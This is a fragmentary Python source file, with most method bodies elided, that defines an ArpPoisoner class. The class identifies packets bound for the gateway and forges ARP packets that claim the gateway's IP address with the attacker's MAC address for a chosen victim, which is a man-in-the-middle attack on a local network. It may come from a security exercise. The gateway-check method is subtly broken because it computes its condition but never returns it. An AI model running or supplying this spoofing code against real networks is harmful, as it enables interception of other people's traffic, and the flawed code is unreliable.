...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet):
        ...
        """
        #check that the mac dst is gateway_mac and that we get that packet from other computers (our_ip is not equal to src IP in packet)
        (packet[S.Ether].dst == self.gateway_mac) and not (packet[S.IP].src == self.our_ip)
    ...
    def create_poison(self, victim_packet):
        ...
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        packet = ARP(op="who-has", hwsrc=self.our_mac, psrc=self.gateway_ip, pdst=victim_packet[S.IP].src)
        return packet
